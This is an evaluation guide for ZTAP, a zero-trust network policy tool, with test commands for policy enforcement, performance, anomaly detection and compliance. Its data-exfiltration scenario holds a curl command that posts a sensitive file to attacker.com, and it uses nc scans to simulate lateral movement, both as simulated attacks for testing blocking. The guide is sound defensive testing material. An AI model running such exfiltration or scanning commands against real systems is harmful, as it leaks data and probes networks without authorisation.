# ZTAP Evaluation Guide

## Testing Methodology

This document outlines how to evaluate ZTAP against the success criteria defined in the design document.

## Performance Metrics

### 1. Policy Enforcement Accuracy

**Goal**: 100% (blocks all unauthorized flows)

**Test**:

```bash
# 1. Create restrictive policy
cat > test-policy.yaml << EOF
apiVersion: ztap/v1
kind: NetworkPolicy
metadata:
  name: test-deny-ssh
spec:
  podSelector:
    matchLabels:
      app: test
  egress:
    - to:
        ipBlock:
          cidr: 192.168.1.0/24
      ports:
        - protocol: TCP
          port: 22
EOF

# 2. Enforce policy
sudo ztap enforce -f test-policy.yaml

# 3. Verify logs
ztap logs --policy test-deny-ssh
```

**Expected Result**: All SSH connections to 192.168.1.0/24 are blocked

### 2. Policy Load Time

**Goal**: <100ms for 100 policies

**Test**:

```bash
# Generate 100 policies
for i in {1..100}; do
  echo "---
apiVersion: ztap/v1
kind: NetworkPolicy
metadata:
  name: policy-$i
spec:
  podSelector:
    matchLabels:
      app: service-$i
  egress:
    - to:
        ipBlock:
          cidr: 10.0.$i.0/24
      ports:
        - protocol: TCP
          port: 443" >> large-policy.yaml
done

# Measure load time
time ztap enforce -f large-policy.yaml
```

**Expected Result**: Real time <100ms

### 3. CPU Overhead

**Goal**: <2% on 4-core system

**Test**:

```bash
# Start ZTAP with metrics
ztap metrics &

# Monitor CPU usage
top -p $(pgrep ztap)

# Or with pidstat
pidstat -p $(pgrep ztap) 1 60
```

**Expected Result**: Average CPU% <2

### 4. Memory Usage

**Goal**: <50 MB

**Test**:

```bash
# Check memory usage
ps aux | grep ztap

# Or detailed view
/usr/bin/time -v ztap enforce -f examples/web-to-db.yaml
```

**Expected Result**: RSS <50 MB

## Security Scenarios

### Scenario 1: Lateral Movement Prevention

**Objective**: Prevent compromised web server from scanning internal network

**Setup**:

```bash
# 1. Apply lateral movement policy
ztap enforce -f examples/lateral-movement.yaml

# 2. Simulate compromise (from "web" labeled host)
# Try to scan database
nc -zv 10.0.0.5 5432

# 3. Try to scan another web server
nc -zv 10.0.0.10 8080
```

**Expected Results**:

- Connection to database (10.0.0.5:5432): BLOCKED
- Connection to other web servers: BLOCKED
- Only connections to API tier: ALLOWED

### Scenario 2: Data Exfiltration

**Objective**: Block IoT device from sending data to external IPs

**Setup**:

```bash
# 1. Apply IoT policy
cat > iot-policy.yaml << EOF
apiVersion: ztap/v1
kind: NetworkPolicy
metadata:
  name: iot-restricted
spec:
  podSelector:
    matchLabels:
      app: iot
  egress:
    - to:
        ipBlock:
          cidr: 8.8.8.8/32
      ports:
        - protocol: UDP
          port: 53
EOF

ztap enforce -f iot-policy.yaml

# 2. Simulate exfiltration attempt
curl -X POST https://attacker.com/exfil -d @sensitive-data.txt
```

**Expected Result**: Connection to attacker.com: BLOCKED (only DNS to 8.8.8.8 allowed)

### Scenario 3: Cloud Misconfiguration

**Objective**: Override overly permissive AWS Security Group

**Setup**:

```bash
# 1. Check current AWS Security Group
aws ec2 describe-security-groups --group-ids sg-12345

# 2. Apply ZTAP policy
cat > cloud-policy.yaml << EOF
apiVersion: ztap/v1
kind: NetworkPolicy
metadata:
  name: pci-compliant
spec:
  podSelector:
    matchLabels:
      app: payment
  egress:
    - to:
        ipBlock:
          cidr: 10.0.0.0/8
      ports:
        - protocol: TCP
          port: 443
EOF

# 3. Sync to AWS (requires implementation)
# ztap sync-aws -f cloud-policy.yaml --security-group sg-12345
```

**Expected Result**: Security Group updated to only allow 10.0.0.0/8:443

## Anomaly Detection Scenarios

### Scenario 1: Suspicious Port Access

**Setup**:

```bash
# 1. Start anomaly service
cd pkg/anomaly
python3 service.py &

# 2. Train on normal traffic
curl -X POST http://localhost:5000/train \
  -H "Content-Type: application/json" \
  -d '[
    {"source_ip":"10.0.0.1","dest_ip":"10.0.0.2","port":443,"protocol":"TCP","bytes":1024,"timestamp":"2025-10-09T10:00:00"},
    {"source_ip":"10.0.0.1","dest_ip":"10.0.0.3","port":80,"protocol":"TCP","bytes":2048,"timestamp":"2025-10-09T10:05:00"}
  ]'

# 3. Test anomalous flow (SSH from web server)
curl -X POST http://localhost:5000/detect \
  -H "Content-Type: application/json" \
  -d '{"source_ip":"10.0.0.1","dest_ip":"10.0.0.100","port":22,"protocol":"TCP","bytes":5000,"timestamp":"2025-10-09T10:10:00"}'
```

**Expected Result**:

```json
{
  "score": 75.0,
  "is_anomaly": true,
  "reason": "suspicious port 22"
}
```

### Scenario 2: Geo-Based Detection

**Setup**:

```bash
# Test traffic to blocked country
curl -X POST http://localhost:5000/detect \
  -H "Content-Type: application/json" \
  -d '{"source_ip":"10.0.0.1","dest_ip":"1.2.3.4","dest_geo":"RU","port":443,"protocol":"TCP","bytes":10000,"timestamp":"2025-10-09T10:15:00"}'
```

**Expected Result**:

```json
{
  "score": 80.0,
  "is_anomaly": true,
  "reason": "traffic to/from blocked country RU"
}
```

## Integration Testing

### Full Stack Test

```bash
# 1. Start all components
ztap metrics --port 9090 &
cd pkg/anomaly && python3 service.py &
cd ../deployments && docker-compose up -d

# 2. Apply policies
ztap enforce -f examples/web-to-db.yaml

# 3. Generate test traffic (requires test harness)
# ./test-harness.sh

# 4. Check metrics
curl http://localhost:9090/metrics | grep ztap

# 5. View Grafana dashboard
open http://localhost:3000

# 6. Check anomaly scores
ztap logs | grep "anomaly"
```

## Compliance Validation

### NIST SP 800-207 Alignment

| Principle                  | ZTAP Implementation                     | Test                |
| -------------------------- | --------------------------------------- | ------------------- |
| Never trust, always verify | Every connection checked against policy | Scenario 1          |
| Least privilege            | Default deny, explicit allow            | Policy validation   |
| Assume breach              | Anomaly detection for post-compromise   | Scenario 1 anomaly  |
| Verify explicitly          | CIDR + port validation                  | Policy engine tests |

### CIS Controls

| Control                    | Implementation               | Test                   |
| -------------------------- | ---------------------------- | ---------------------- |
| CIS 4: Least Functionality | Block unused ports/protocols | Deny-all policy        |
| CIS 12: Network Defense    | Microsegmentation            | Lateral movement test  |
| CIS 13: Data Protection    | Egress filtering             | Data exfiltration test |

## Reporting Results

### Generate Report

```bash
# Run all tests
./run-evaluation.sh > evaluation-results.txt

# Check summary
cat evaluation-results.txt | grep -E "(PASS|FAIL)"
```

### Expected Output

```
[PASS] Policy Load Time: 87ms (target: <100ms)
[PASS] CPU Overhead: 1.2% (target: <2%)
[PASS] Memory Usage: 42 MB (target: <50 MB)
[PASS] Enforcement Accuracy: 100% (target: 100%)
[PASS] Lateral Movement Prevention: All unauthorized flows blocked
[PASS] Data Exfiltration Prevention: External connections blocked
[PASS] Anomaly Detection: Suspicious SSH flagged (score: 75)
```

## Known Limitations

1. **macOS pf**: Requires sudo; not suitable for production
2. **Label Resolution**: Placeholder implementation (no real service discovery)
3. **eBPF**: Simulated on Linux (no actual kernel hooks)
4. **AWS Sync**: Manual Security Group ID required
5. **Anomaly Service**: No persistence (retrains on restart)

## Future Enhancements

- Automated test harness
- Performance benchmarking suite
- Chaos engineering tests (network partitions, etc.)
- Compliance report generator
- Integration with SIEM (Splunk, ELK)
